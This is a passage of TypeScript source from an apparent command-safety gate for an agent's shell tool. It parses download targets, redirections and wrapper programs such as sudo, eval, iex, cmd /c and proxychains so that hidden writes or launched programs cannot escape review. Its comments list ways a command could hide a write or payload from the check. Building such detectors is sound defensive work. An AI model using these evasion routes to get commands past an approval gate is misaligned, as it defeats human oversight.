 *   A program that writes into its own store (`docker pull`, `ollama pull`,
 *   `comfy model download`, `hf download` without `--local-dir`) names no path
 *   and adds none.
 */
export interface DownloadTarget {
  path: string | null;
  after: number | null;
}

export interface DownloadWrites {
  dirs: Array<string | null>;
  targets: DownloadTarget[];
}

/**
 * The kind of shell a command is judged for. The null sink is the host's own
 * (`isNullSink`): `NUL` is a device only where Windows resolves it, and on any
 * other host `curl -o nul` writes a real file named `nul` (#669).
 */
export type ShellHost = 'windows' | 'posix';

export function downloadWrites(cmd: string, host: ShellHost): DownloadWrites {
  const out: DownloadWrites = { dirs: [], targets: [] };
  if (typeof cmd !== 'string' || cmd.trim() === '') return out;
  // Where a line writes is read ONCE, in order, because each target is judged
  // from the folders before it (`dirs`, `after`): the two readings of a line
  // whose shell is not known cannot be merged. It is read with the grammar
  // that ends a command at `;`, `&` and `|` and keeps a backslash a path
  // separator, PowerShell's, as the place analysis always did (#669); the
  // kind of action (`staticShellCategories`) is read per host.
  const units = commandUnits(withoutRedirections(cmd), 0, 'powershell');
  // `iwr URL | Set-Content file`: where the fetched bytes land, kept only if
  // the line downloads.
  const piped: DownloadTarget[] = [];
  let downloads = false;
  for (const unit of units) {
    const program = unit[0] ?? '';
    const args = unit.slice(1);
    if (CHANGE_DIR.has(program)) {
      const dir = changeDirArg(program, args);
      out.dirs.push(dir === null ? null : readablePath(dir));
      continue;
    }
    for (const t of pipeWriterTargets(program, args))
      if (!isNullSink(t, host)) piped.push({ path: readablePath(t), after: out.dirs.length });
    if (!unitCategories(unit).includes('download')) continue;
    downloads = true;
    for (const t of fetcherTargets(program, args))
      if (t === null || !isNullSink(t, host))
        out.targets.push({ path: t === null ? null : readablePath(t), after: out.dirs.length });
  }
  // `curl URL > file`: the bytes land where the shell sends them. Read on a
  // line that downloads (or reads a URL into a redirection, which
  // `staticShellCategories` files as a download).
  if (downloads || staticShellCategories(cmd, host).includes('download')) {
    out.targets.push(...piped);
    for (const t of redirectionTargets(cmd))
      if (!isNullSink(t, host)) out.targets.push({ path: readablePath(t), after: null });
  }
  return out;
}

const CHANGE_DIR = new Set([
  'cd',
  'chdir',
  'pushd',
  'popd',
  'set-location',
  'sl',
  'push-location',
  'pop-location',
]);

/**
 * The folder a `cd`-like unit moves into; null for home or back (`cd`, `cd ~`,
 * `cd -`, `popd`, `Pop-Location`): where that leads is not in this unit.
 */
function changeDirArg(program: string, args: readonly string[]): string | null {
  if (program === 'popd' || program === 'pop-location') return null;
  if (program === 'set-location' || program === 'sl' || program === 'push-location') {
    const i = args.findIndex((a) => /^-(literal)?path$/i.test(a));
    const value = i >= 0 ? args[i + 1] : args.find((a) => !a.startsWith('-'));
    return value ?? null;
  }
  // `cd /d D:\x` (cmd) takes a drive switch before the folder.
  const value = args.find((a) => !/^(-[LP]|\/d)$/i.test(a));
  if (value === undefined || value === '-') return null;
  return value;
}

/**
 * The null sink of the host that runs the command, and nothing else (#669,
 * approbation 0330a0fc du 02/10 : `curl -o /dev/null` lu comme un fichier hors
 * de l'espace interrogeait la personne). THE one exemption every write goes
 * through (a fetcher's output, a pipe writer, a redirection): what is written
 * there lands in no place.
 *
 * - POSIX host: `/dev/null`.
 * - Windows host (the commands run in cmd.exe): `NUL` in any case, with a `:`
 *   or an extension (`nul:`, `nul.json`, `NUL.tar.gz`: the device is what
 *   comes before the first dot). Not PowerShell's `$null`: the shell
 *   run_command uses on Windows is cmd.exe, where `$null` is a plain file name, so
 *   it is read as a variable the shell decides (it asks). A PowerShell payload
 *   that really means the null device over-asks, which a safety net may do.
 *
 * Every other name is an ordinary place, judged like any path and shown as
 * written: `/dev/zero`, `/dev/tty`, `CON`, and the descriptor aliases
 * (`/dev/stdin`, `/dev/stdout`, `/dev/fd/N`) whose target depends on
 * redirections and descriptor copies the text may not show (`3<f 0<&3`).
 * `/dev/null` on a Windows host is one too: cmd.exe reads it as `\dev\null` of
 * the current drive. The price is a few harmless asks (`-o /dev/stdout`); the
 * gain, an exemption that can never hide a write. Only the bare name: `nul/a.json`
 * or `/tmp/dev/null` are places. A tool's own `-` for its standard output is
 * read where the tool is (`curl -o -`, `wget -O -`): for a shell redirection or
 * `tee`, `-` is a file. What KIND of action the line is does not change: only
 * where it writes.
 */
function isNullSink(p: string, host: ShellHost): boolean {
  return host === 'windows' ? WINDOWS_NUL.test(p) : p === '/dev/null';
}

const WINDOWS_NUL = /^nul(?::|\.[^\\/]*)?$/i;

/** A path as written, or null when the shell decides it at run time. */
function readablePath(p: string): string | null {
  if (p === '' || /[$%`]/.test(p) || p.startsWith('~')) return null;
  return p;
}

/** The value of a flag written `-f v`, `-fv` (short only), `--flag=v` or `-Flag:v`. */
function flagValues(
  args: readonly string[],
  matches: (flag: string) => boolean,
  attachedShort?: string,
): string[] {
  const values: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] ?? '';
    const eq = a.match(/^(--?[\w-]+)[=:](.*)$/);
    if (eq && matches(eq[1] ?? '')) values.push(eq[2] ?? '');
    else if (matches(a)) values.push(args[i + 1] ?? '');
    else if (attachedShort && a.startsWith(attachedShort) && a.length > attachedShort.length)
      values.push(a.slice(attachedShort.length));
  }
  return values;
}

/**
 * The short options of a fetcher that take a value (from each program's
 * manual). In a group (`-sLo x`, `-sLox`, `-qO-`), options without a value
 * stack, and the first one that takes a value takes the rest of the group, or
 * the next word when the group ends with it: `-XPOST` is `-X POST`, not an
 * `-O` (#614, revue Nodal de la PR #618, passe 3).
 */
const SHORT_VALUE_OPTIONS: Record<'curl' | 'wget' | 'aria2c', string> = {
  curl: 'AbcCdDeEFHKmoPQrtTuUwxXyYz',
  wget: 'aABDeIilOoPQRtTUwX',
  aria2c: 'dijklmostUx',
};

/** Every short option of `args` as the program reads it, with its value ('' for a switch). */
function shortOptions(
  args: readonly string[],
  program: keyof typeof SHORT_VALUE_OPTIONS,
): Array<{ option: string; value: string }> {
  const takesValue = SHORT_VALUE_OPTIONS[program];
  const read: Array<{ option: string; value: string }> = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] ?? '';
    if (!/^-[A-Za-z]/.test(a)) continue;
    for (let j = 1; j < a.length; j++) {
      const option = a[j] ?? '';
      if (!takesValue.includes(option)) {
        read.push({ option, value: '' });
        continue;
      }
      const rest = a.slice(j + 1);
      read.push({ option, value: rest !== '' ? rest : (args[++i] ?? '') });
      break;
    }
  }
  return read;
}

/** The values a program's short option `option` was given. */
function shortValues(
  args: readonly string[],
  program: keyof typeof SHORT_VALUE_OPTIONS,
  option: string,
): string[] {
  return shortOptions(args, program)
    .filter((o) => o.option === option)
    .map((o) => o.value);
}

function joinPath(dir: string, name: string): string {
  if (/^([A-Za-z]:)?[\\/]/.test(name)) return name;
  return dir === '.' ? name : `${dir.replace(/[\\/]$/, '')}/${name}`;
}

/** Where one download unit writes, by program; null where the text does not say. */
function fetcherTargets(program: string, args: readonly string[]): Array<string | null> {
  const lower = args.map((a) => a.toLowerCase());
  switch (program) {
    case 'curl': {
      const outDir = flagValues(args, (f) => f === '--output-dir')[0];
      const files = [
        ...flagValues(args, (f) => f === '--output'),
        ...shortValues(args, 'curl', 'o'),
      ];
      const remote =
        args.some((a) => /^--remote-name(-all)?$/.test(a)) ||
        shortOptions(args, 'curl').some((o) => o.option === 'O');
      const targets = files.filter((f) => f !== '-').map((f) => joinPath(outDir ?? '.', f));
      if (remote) targets.push(outDir ?? '.');
      return targets;
    }
    case 'wget': {
      const docs = [
        ...flagValues(args, (f) => f === '--output-document'),
        ...shortValues(args, 'wget', 'O'),
      ];
      const logs = [
        ...flagValues(args, (f) => f === '--output-file' || f === '--append-output'),
        ...shortValues(args, 'wget', 'o'),
        ...shortValues(args, 'wget', 'a'),
      ];
      const prefix = [
        ...flagValues(args, (f) => f === '--directory-prefix'),
        ...shortValues(args, 'wget', 'P'),
      ][0];
      const targets = [...docs.filter((d) => d !== '-'), ...logs].map((f) =>
        joinPath(prefix ?? '.', f),
      );
      if (docs.length === 0) targets.push(prefix ?? '.');
      return targets;
    }
    case 'invoke-webrequest':
    case 'iwr':
    case 'invoke-restmethod':
    case 'irm':
      // Without -OutFile the content is returned, not written.
      return flagValues(args, (f) => /^-outf/i.test(f));
    case 'start-bitstransfer': {
      const dest = flagValues(args, (f) => /^-dest/i.test(f));
      // Positional destination: which word is a value and which a switch is
      // not readable without the cmdlet's signature, so it asks.
      return dest.length > 0 ? dest : [null];
    }
    case 'aria2c': {
      const dir =
        [...flagValues(args, (f) => f === '--dir'), ...shortValues(args, 'aria2c', 'd')][0] ?? '.';
      const outs = [...flagValues(args, (f) => f === '--out'), ...shortValues(args, 'aria2c', 'o')];
      return outs.length > 0 ? outs.map((o) => joinPath(dir, o)) : [dir];
    }
    case 'git': {
      // `git [global options] clone [options] URL [DIR]`, and `git -C dir lfs pull`.
      const base = flagValues(args, (f) => f === '-C')[0] ?? '.';
      const sub = lower.indexOf('clone');
      if (sub < 0) return [base];
      const rest = args.slice(sub + 1);
      const positional: string[] = [];
      for (let i = 0; i < rest.length; i++) {
        const a = rest[i] ?? '';
        if (a.startsWith('-')) {
          if (!a.includes('=') && GIT_CLONE_VALUE_FLAGS.has(a)) i++;
          continue;
        }
        positional.push(a);
      }
      const separate = flagValues(rest, (f) => f === '--separate-git-dir');
      return [joinPath(base, positional[1] ?? '.'), ...separate];
    }
    case 'pip':
    case 'pip3':
      return [flagValues(args, (f) => f === '-d' || f === '--dest', '-d')[0] ?? '.'];
    case 'hf':
    case 'huggingface-cli':
      // Without --local-dir, the Hugging Face cache: the program's own store.
      return flagValues(args, (f) => f === '--local-dir');
    case 'comfy':
    case 'ollama':
    case 'docker':
    case 'podman':
    case 'docker-compose':
    case 'podman-compose':
      // Their own store (the ComfyUI install, the model or image store): the
      // command names no path.
      return [];
    default:
      // A fetcher this reading does not know the flags of: it asks.
      return [null];
  }
}

/** `git clone` options that take a value as the next word. */
const GIT_CLONE_VALUE_FLAGS = new Set([
  '-b',
  '--branch',
  '-o',
  '--origin',
  '-c',
  '--config',
  '-u',
  '--upload-pack',
  '-j',
  '--jobs',
  '--depth',
  '--reference',
  '--reference-if-able',
  '--separate-git-dir',
  '--template',
  '--filter',
  '--shallow-since',
  '--shallow-exclude',
  '--server-option',
  '--bundle-uri',
]);

/**
 * Where the shell writes a line's output, read as OPERATORS, each found on its own so that none can hide another (`2>/dev/null>../x`
 * is two): `>`, `>>`, `>|`, `&>`, `&>>`, the same on another descriptor
 * (`2>`, `2>>`, `2>|`: the error log of a download is a write too), and
 * read/write (`<>`, `1<>`: its `>` opens the target for writing). The target is
 * the next word, attached or after spaces. No file is named by a duplication
 * (`2>&1`, `>&2`, `2>&-`, `<&0`: `>&file` is the bash form of `&>file` and does),
 * an input (`< file`), a here-document or here-string, or a process
 * substitution (`<(…)`, `>(…)`).
 *
 * Quotes are NOT read: an operator counts wherever it stands. A quote state
 * would hide the payload of `bash -c '… > f'` and everything after an escaped
 * quote (`"O\"Brien" … > f`), and a safety net may over-ask but never under-
 * report. The price is one harmless extra place when a `>` sits inside a quoted
 * string of a download (`"…?p=1>2"` reads a file `2`).
 */
function redirectionTargets(cmd: string): string[] {
  const targets: string[] = [];
  const delimiter = /[\s;&|()<>]/;
  let i = 0;
  /** The word that starts at `i` (after spaces): a quoted one whole, otherwise up to a delimiter. */
  const word = (): string => {
    while (i < cmd.length && /\s/.test(cmd[i] ?? '')) i++;
    const open = cmd[i];
    if (open === '"' || open === "'") {
      const end = cmd.indexOf(open, i + 1);
      if (end >= 0) {
        const quoted = cmd.slice(i + 1, end);
        i = end + 1;
        return quoted;
      }
    }
    const start = i;
    while (i < cmd.length && !delimiter.test(cmd[i] ?? '')) i++;
    return stripQuotes(cmd.slice(start, i));
  };
  while (i < cmd.length) {
    const c = cmd[i] ?? '';
    if (c !== '>' && c !== '<') {
      i++;
      continue;
    }
    const next = cmd[i + 1] ?? '';
    if (next === '(') {
      i += 2; // process substitution
    } else if (c === '<') {
      // `<>` (read/write) is an input followed by the `>` that opens its target
      // for writing: the next turn of the loop reads that `>` on its own.
      if (next === '<') {
        i += cmd[i + 2] === '<' ? 3 : 2; // here-string, here-document
      } else if (next === '&') {
        i += 2; // input duplication
        word();
      } else {
        i++; // input
      }
    } else if (next === '&') {
      i += 2;
      const t = word();
      // `>&2`, `>&-` copy a descriptor; `>&file` (bash) writes both streams to it.
      if (t !== '' && !/^(\d+|-)$/.test(t)) targets.push(t);
    } else {
      i += next === '>' || next === '|' ? 2 : 1;
      const t = word();
      if (t !== '') targets.push(t);
    }
  }
  return targets;
}

/** Where a program at the end of a pipe writes what it reads: `Out-File x`, `tee x`. */
function pipeWriterTargets(program: string, args: readonly string[]): string[] {
  if (['out-file', 'set-content', 'add-content', 'tee-object'].includes(program)) {
    const named = flagValues(args, (f) => /^-(file)?path$|^-literalpath$/i.test(f));
    return named.length > 0 ? named : args.filter((a) => !a.startsWith('-')).slice(0, 1);
  }
  if (program === 'tee') return args.filter((a) => !a.startsWith('-'));
  return [];
}

/** True when `re` matches at the very start of `text`. */
function startsWithMatch(re: RegExp, text: string): boolean {
  const m = new RegExp(re.source, re.flags.replace('g', '')).exec(text);
  return m !== null && m.index === 0;
}

/**
 * Which shell reads a line or a list of words. The shell of the WRAPPER that
 * runs it, whatever the line around was (review of PR #682, pass 2): `cmd /c`
 * → cmd, `powershell -Command` → PowerShell, `sh -c` / `wsl` → a POSIX shell,
 * `timeout`, `sudo`, `Start-Process`… → no shell, the program is executed.
 * It decides where a command ends and how quotes and escapes read (pass 3,
 * `splitQuotedShellWords`), and that `start` is cmd's, with a window title,
 * only in cmd (in PowerShell it is Start-Process).
 */
type LineShell = 'cmd' | 'powershell' | 'sh' | 'exec';

/** What a program that runs another one starts: a line read again, or the words of a program. */
type Payload =
  | { line: string; shell: LineShell }
  | { words: ShellWord[]; shell: LineShell; invoked?: boolean };

/**
 * cmd's `start ["title"] [/switches] program args`: the first quoted argument
 * before the program is ALWAYS the window title, empty or not, wherever the
 * switches sit (review of PR #682, pass 1). Never what it starts.
 */
function withoutStartTitle(args: readonly ShellWord[]): ShellWord[] {
  for (let j = 0; j < args.length; j++) {
    if (args[j]?.quoted) return [...args.slice(0, j), ...args.slice(j + 1)];
    if (!/^\/\w+$/.test(args[j]?.text ?? '')) break;
  }
  return [...args];
}

/**
 * The words after a program's options: `-x`, `--long`, `--long=v`, and for the
 * options in `valued`, the word that follows. `--` ends them.
 */
function afterOptions(args: readonly ShellWord[], valued: ReadonlySet<string>): ShellWord[] {
  let i = 0;
  while (i < args.length) {
    const w = args[i]?.text ?? '';
    if (w === '--') return args.slice(i + 1);
    if (!/^-./.test(w)) break;
    i += valued.has(w) ? 2 : 1;
  }
  return args.slice(i);
}

const argv = (words: readonly ShellWord[], shell: LineShell = 'exec'): Payload[] =>
  words.length > 0 ? [{ words: [...words], shell }] : [];

/** One of `names` among a program's words. */
const hasAny = (args: readonly ShellWord[], names: readonly string[]): boolean =>
  args.some((a) => names.includes(a.text));

/** The words after a leading number (`chrt 10 cmd`). */
const afterNumber = (args: readonly ShellWord[]): ShellWord[] =>
  /^\d+$/.test(args[0]?.text ?? '') ? args.slice(1) : [...args];

/** `-c LINE` / `--command LINE`, read by a POSIX shell (`su -c`, `runuser -c`, `expect -c`). */
function commandOption(args: readonly ShellWord[]): Payload[] {
  const i = args.findIndex((a) => a.text === '-c' || a.text === '--command');
  const line = i < 0 ? undefined : args[i + 1];
  return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
}

/** strace/ltrace options that take a value. */
const TRACE_VALUED = new Set([
  '-o',
  '-e',
  '-p',
  '-s',
  '-u',
  '-E',
  '-I',
  '-a',
  '-P',
  '-X',
  '-O',
  '-S',
  '-b',
]);

/** `sh -c LINE`, `bash -lc LINE`, `zsh -o pipefail -c LINE`: a script file is not opened here. */
function shellLine(args: readonly ShellWord[]): Payload[] {
  for (let i = 0; i < args.length; i++) {
    const w = args[i]?.text ?? '';
    if (/^-[a-z]*c[a-z]*$/i.test(w)) {
      const line = args[i + 1];
      return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
    }
    if (w === '-o' || w === '+o') i += 1;
    else if (!/^[-+]/.test(w)) return [];
  }
  return [];
}

/**
 * What `cmd /c` reads again: its own command line from the word after `/c`.
 * Read by cmd, that is the raw text (quotes and all); handed over by another
 * shell, the words as a program receives them, a quoted one quoted again.
 * `cmd /s /c "…"`: the outer quotes of that line are cmd's.
 */
function cmdLine(rest: readonly ShellWord[], from: LineShell): Payload[] {
  if (rest.length === 0) return [];
  const raw = (
    from === 'cmd' && rest[0]?.tail !== undefined
      ? rest[0].tail
      : rest.map((w) => (w.quoted ? `"${w.text}"` : w.text)).join(' ')
  ).trim();
  const line = raw.length >= 2 && raw.startsWith('"') && raw.endsWith('"') ? raw.slice(1, -1) : raw;
  return [{ line, shell: 'cmd' }];
}

/** A shell's reserved word that comes before a command it runs: `do rm x`, `then lp x`. */
const before = (args: readonly ShellWord[], shell: LineShell): Payload[] => argv(args, shell);

/**
 * Programs whose purpose is to run another program, each with its own option
 * grammar (#667, review of PR #682, pass 2). ONE mechanism: what they run is
 * read as a command of its own, for every kind of action, and the program
 * itself stays a unit. Every entry of `SHELL_PROGRAMS` (shell-programs.ts, the
 * same knowledge for the command allowlist) has one here, a test says so; a
 * program that defines rather than runs (`doskey`) runs nothing.
 */
const RUNS_ANOTHER: Record<string, (args: readonly ShellWord[], shell: LineShell) => Payload[]> = {
  // shells
  cmd: (args, shell) => {
    // Every switch before /c, /k or /r is cmd's own (`/q /d /s /v:on`).
    for (let i = 0; i < args.length; i++) {
      const w = (args[i]?.text ?? '').toLowerCase();
      if (w === '/c' || w === '/k' || w === '/r') return cmdLine(args.slice(i + 1), shell);
      if (!/^\/\w/.test(w)) return [];
    }
    return [];
  },
  // PowerShell joins the words after -Command into its script.
  powershell: (args) => {
    const i = args.findIndex((a) => /^-c(o(m(m(a(n(d)?)?)?)?)?)?$/i.test(a.text));
    const rest = i < 0 ? [] : args.slice(i + 1);
    return rest.length === 0
      ? []
      : [{ line: rest.map((a) => a.text).join(' '), shell: 'powershell' }];
  },
  sh: shellLine,
  bash: shellLine,
  zsh: shellLine,
  ksh: shellLine,
  csh: shellLine,
  tcsh: shellLine,
  dash: shellLine,
  ash: shellLine,
  fish: shellLine,
  // `wsl [-d distro] [-u user] [--cd dir] cmd…`: the distribution's shell reads
  // it; `-e` executes it; `--list`, `--shutdown` and the rest manage WSL.
  wsl: (args) => {
    const valued = new Set(['-d', '--distribution', '-u', '--user', '--cd', '--distribution-id']);
    for (let i = 0; i < args.length; i++) {
      const w = args[i]?.text ?? '';
      if (valued.has(w)) i += 1;
      else if (w === '-e' || w === '--exec') return argv(args.slice(i + 1));
      else if (w === '--') return argv(args.slice(i + 1), 'sh');
      else if (/^-/.test(w)) return [];
      else return argv(args.slice(i), 'sh');
    }
    return [];
  },
  busybox: (args) => argv(afterOptions(args, new Set())),
  eval: (args) =>
    args.length > 0 ? [{ line: args.map((a) => a.text).join(' '), shell: 'sh' }] : [],
  script: (args) => {
    const i = args.findIndex((a) => a.text === '-c' || a.text === '--command');
    const line = i < 0 ? undefined : args[i + 1];
    return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
  },
  // launchers
  env: (args) => {
    const valued = new Set(['-u', '--unset', '-C', '--chdir']);
    let i = 0;
    while (i < args.length) {
      const w = args[i]?.text ?? '';
      if (w === '-S' || w === '--split-string') {
        const line = args[i + 1];
        return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
      }
      if (w === '--') i += 1;
      else if (valued.has(w)) i += 2;
      else if (/^-/.test(w) || /^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) i += 1;
      else break;
    }
    return argv(args.slice(i));
  },
  sudo: (args) =>
    argv(
      afterOptions(
        args,
        new Set(['-u', '-g', '-C', '-D', '-h', '-p', '-r', '-t', '-U', '-T', '--user', '--group']),
      ),
    ),
  doas: (args) => argv(afterOptions(args, new Set(['-u', '-C']))),
  nohup: (args) => argv(afterOptions(args, new Set())),
  nice: (args) => argv(afterOptions(args, new Set(['-n', '--adjustment']))),
  time: (args) => argv(afterOptions(args, new Set(['-f', '-o', '--format', '--output']))),
  // GNU `timeout [options] DURATION cmd…`; Windows' `timeout /t 5` only waits.
  timeout: (args) => {
    const rest = afterOptions(args, new Set(['-s', '--signal', '-k', '--kill-after']));
    if (!/^\d+(\.\d+)?[smhd]?$/.test(rest[0]?.text ?? '')) return [];
    return argv(rest.slice(1));
  },
  // ── exec wrappers (review of PR #682, pass 5): each runs the command that
  // follows its own options, as it is, in another process state.
  setsid: (args) => argv(afterOptions(args, new Set())),
  stdbuf: (args) =>
    argv(afterOptions(args, new Set(['-i', '-o', '-e', '--input', '--output', '--error']))),
  // With `-p PID` they act on a running process: the word left is a number.
  ionice: (args) => argv(afterOptions(args, new Set(['-c', '-n', '--class', '--classdata']))),
  // `chrt [options] PRIORITY cmd…`
  chrt: (args) => argv(afterNumber(afterOptions(args, new Set()))),
  // `taskset [options] MASK|LIST cmd…`
  taskset: (args) => argv(afterOptions(args, new Set()).slice(1)),
  unbuffer: (args) => argv(afterOptions(args, new Set())),
  strace: (args) => argv(afterOptions(args, TRACE_VALUED)),
  ltrace: (args) => argv(afterOptions(args, TRACE_VALUED)),
  valgrind: (args) => argv(afterOptions(args, new Set())),
  // `watch` hands its words to `sh -c` (`-x` executes them).
  watch: (args) => {
    const rest = afterOptions(args, new Set(['-n', '--interval', '-q', '--equexit']));
    if (rest.length === 0) return [];
    return hasAny(args, ['-x', '--exec'])
      ? argv(rest)
      : [{ line: rest.map((a) => a.text).join(' '), shell: 'sh' }];
  },
  // `flock [options] FILE cmd…` or `flock [options] FILE -c LINE`; `flock FD` runs nothing.
  flock: (args) => {
    const rest = afterOptions(args, new Set(['-w', '--timeout', '-E', '--conflict-exit-code']));
    const after = rest.slice(1);
    const c = after.findIndex((a) => a.text === '-c' || a.text === '--command');
    if (c >= 0) {
      const line = after[c + 1];
      return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
    }
    return argv(after);
  },
  // `chroot [options] NEWROOT [cmd…]`
  chroot: (args) => argv(afterOptions(args, new Set()).slice(1)),
  unshare: (args) =>
    argv(
      afterOptions(
        args,
        new Set([
          '-S',
          '--setuid',
          '-G',
          '--setgid',
          '--map-user',
          '--map-group',
          '-R',
          '--root',
          '-w',
          '--wd',
        ]),
      ),
    ),
  nsenter: (args) =>
    argv(afterOptions(args, new Set(['-t', '--target', '-S', '--setuid', '-G', '--setgid']))),
  'systemd-run': (args) =>
    argv(
      afterOptions(
        args,
        new Set([
          '-p',
          '--property',
          '-u',
          '--unit',
          '-E',
          '--setenv',
          '--uid',
          '--gid',
          '-M',
          '--machine',
          '-H',
          '--host',
          '--description',
          '--slice',
          '--working-directory',
          '--on-calendar',
          '--on-active',
        ]),
      ),
    ),
  firejail: (args) => argv(afterOptions(args, new Set())),
  // macOS: `caffeinate [-disu] [-t seconds] [-w pid] [utility args]`
  caffeinate: (args) => argv(afterOptions(args, new Set(['-t', '-w']))),
  builtin: (args) => argv(args),
  pkexec: (args) => argv(afterOptions(args, new Set(['--user']))),
  // `su [user] -c LINE`, `runuser -u user -- cmd…` / `runuser -c LINE`
  su: (args) => commandOption(args),
  runuser: (args) => {
    const line = commandOption(args);
    return line.length > 0
      ? line
      : argv(afterOptions(args, new Set(['-u', '--user', '-g', '--group', '-G', '-s', '--shell'])));
  },
  proxychains: (args) => argv(afterOptions(args, new Set(['-f']))),
  torsocks: (args) => argv(afterOptions(args, new Set(['-u', '-p', '-a', '-P']))),
  eatmydata: (args) => argv(afterOptions(args, new Set())),
  fakeroot: (args) => argv(afterOptions(args, new Set(['-l', '-s', '-i']))),
  'dbus-launch': (args) => argv(afterOptions(args, new Set())),
  // `expect -c "spawn cmd…"`: Tcl, whose `spawn` starts a program.
  expect: (args) => commandOption(args),
  spawn: (args) => argv(afterOptions(args, new Set())),
  exec: (args) => argv(afterOptions(args, new Set(['-a']))),
  // `command -v x` only looks x up.
  command: (args) =>
    args.some((a) => a.text === '-v' || a.text === '-V') ? [] : argv(afterOptions(args, new Set())),
  xargs: (args) =>
    argv(
      afterOptions(
        args,
        new Set(['-I', '-n', '-P', '-L', '-s', '-d', '-E', '-a', '--max-args', '--max-procs']),
      ),
    ),
  // `runas [/user:x] [/savecred…] "program args"`: one command line.
  runas: (args) => {
    const rest = args.filter((a) => !/^\/\w/.test(a.text));
    return rest[0] === undefined ? [] : [{ line: rest[0].text, shell: 'exec' }];
  },
  call: (args) => argv(args, 'cmd'),
  // cmd's `for %f in (set) do command`.
  for: (args) => {
    const i = args.findIndex((a) => a.text.toLowerCase() === 'do');
    return i < 0 ? [] : argv(args.slice(i + 1), 'cmd');
  },
  doskey: () => [],
  // cmd's start, PowerShell's Start-Process: what it starts, with its arguments.
  start: (args) => launchedWords(args),
  'start-process': (args) => launchedWords(args),
  saps: (args) => launchedWords(args),
  // `find … -exec cmd {} ;`, each of them.
  find: (args) => {
    const payloads: Payload[] = [];
    for (let i = 0; i < args.length; i++) {
      if (!['-exec', '-execdir', '-ok', '-okdir'].includes(args[i]?.text ?? '')) continue;
      const end = args.findIndex((a, j) => j > i && [';', '\\;', '+'].includes(a.text));
      payloads.push(...argv(args.slice(i + 1, end > i ? end : undefined)));
      if (end > i) i = end;
    }
    return payloads;
  },
  // PowerShell's Invoke-Expression: the string is code, read by PowerShell.
  // Without one it runs what the pipeline hands it (inline code, `isInlineEvalUnit`).
  iex: (args) => {
    const rest = args.filter((a) => !/^-c(o(m(m(a(n(d)?)?)?)?)?)?$/i.test(a.text));
    return rest.length === 0
      ? []
      : [{ line: rest.map((a) => a.text).join(' '), shell: 'powershell' }];
  },
  // The call and dot-source operators run what they name, even a `$variable`.
  '&': (args, shell) => (args.length > 0 ? [{ words: [...args], shell, invoked: true }] : []),
  '.': (args, shell) => (args.length > 0 ? [{ words: [...args], shell, invoked: true }] : []),
  source: (args, shell) => argv(args, shell),
  // a POSIX shell's reserved words before a command (`for …; do rm $f; done`)
  do: before,
  then: before,
  else: before,
  elif: before,
  if: before,
  while: before,
  until: before,
  '!': before,
};
RUNS_ANOTHER['pwsh'] = RUNS_ANOTHER['powershell'] as (typeof RUNS_ANOTHER)[string];
RUNS_ANOTHER['invoke-expression'] = RUNS_ANOTHER['iex'] as (typeof RUNS_ANOTHER)[string];
RUNS_ANOTHER['gtimeout'] = RUNS_ANOTHER['timeout'] as (typeof RUNS_ANOTHER)[string];
RUNS_ANOTHER['proxychains4'] = RUNS_ANOTHER['proxychains'] as (typeof RUNS_ANOTHER)[string];

/**
 * Words that name a shell's keyword, builtin, alias or cmdlet, not a file:
 * written with a path (`./start`, `C:\x\start.exe`), they name that file
 * (review of PR #682, pass 4). A path to a real program that runs another
 * (`/usr/bin/sudo`, `C:\Windows\System32\cmd.exe`) is still that program.
 */
const SHELL_KEYWORDS = new Set([
  'start',
  'call',
  'for',
  'doskey',
  'do',
  'then',
  'else',
  'elif',
  'if',
  'while',
  'until',
  '!',
  'eval',
  'exec',
  'command',
  'source',
  'iex',
  'invoke-expression',
  'start-process',
  'saps',
  'ii',
  'invoke-item',
  'out-printer',
  'send-mailmessage',
]);

/**
 * A program word the text does not name: it comes from a variable (`$c`,
 * `%X%`, `!X!`) or a substitution (`` `…` ``, `$(…)`, `lpr$(echo)`, PowerShell's
 * `& (…)`). Like a download target decided when the command runs (#614), it
 * cannot be read ahead (review of PR #682, pass 4).
 */
function isDecidedAtRunTime(word: string): boolean {
  // `$x`, backticks; cmd's `%X%`, `%f`, `%%f`, `%~dpnxf`, `%1`…`%9`, `%*`,
  // `%~1`, `%~dp0`, and delayed `!X!` (review of PR #682, pass 5).
  return /[$`]|%%?(~[a-z]*)?[a-z0-9*]|![^!\s]+!/i.test(word);
}

/**
 * True when a command line runs a program the text does not name. The gate
 * asks for it even when inline code is allowed, as an allowed download asks
 * when its target is decided at run time.
 */
export function programDecidedAtRunTime(cmd: string, host?: ShellHost): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  return commandUnits(withoutRedirections(cmd), 0, topShell(host)).some((u) =>
    isDecidedAtRunTime(u[0] ?? ''),
  );
}

/** The programs whose purpose is to run another one, as `commandUnits` reads them. */
export const RUNS_ANOTHER_PROGRAMS: readonly string[] = Object.keys(RUNS_ANOTHER);

/** What `start` / `Start-Process` starts, as the words of a program (no shell). */
function launchedWords(args: readonly ShellWord[]): Payload[] {
  const { target, launched } = readLaunch(args.map((a) => a.text));
  if (target === null) return [];
  return argv([target, ...launched].map((text) => ({ text, quoted: false })));
}

/** True when a unit's program runs another one: its own words are not the work. */
function runsAnother(unit: readonly string[]): boolean {
  const grammar = RUNS_ANOTHER[unit[0] ?? ''];
  return (
    grammar !== undefined &&
    grammar(
      unit.slice(1).map((text) => ({ text, quoted: false })),
      'exec',
    ).length > 0
  );
}

/**
 * The commands a command line actually runs, as token lists whose first token
 * is the program (its basename, lower-cased, without `.exe`): each command of
 * the line, the module of `python -m`, what `$(…)` / backticks run, and what
 * every program of `RUNS_ANOTHER` starts, the program itself kept as a unit.
 *
 * `shell` is the shell that READS the line: where a command ends, what quotes
 * and what escapes follow its grammar (review of PR #682, pass 3). A line
 * whose shell is not known (`run_command` uses cmd.exe on Windows and sh
 * elsewhere, `topShell`) is read as both, and every command either would run
 * is kept: a net may over-ask, never under-report.
 */
export function commandUnits(cmd: string, depth = 0, shell?: LineShell): string[][] {
  if (shell === undefined) {
    const seen = new Set<string>();
    return [...commandUnits(cmd, depth, 'cmd'), ...commandUnits(cmd, depth, 'sh')].filter(
      (unit) => {
        const key = JSON.stringify(unit);
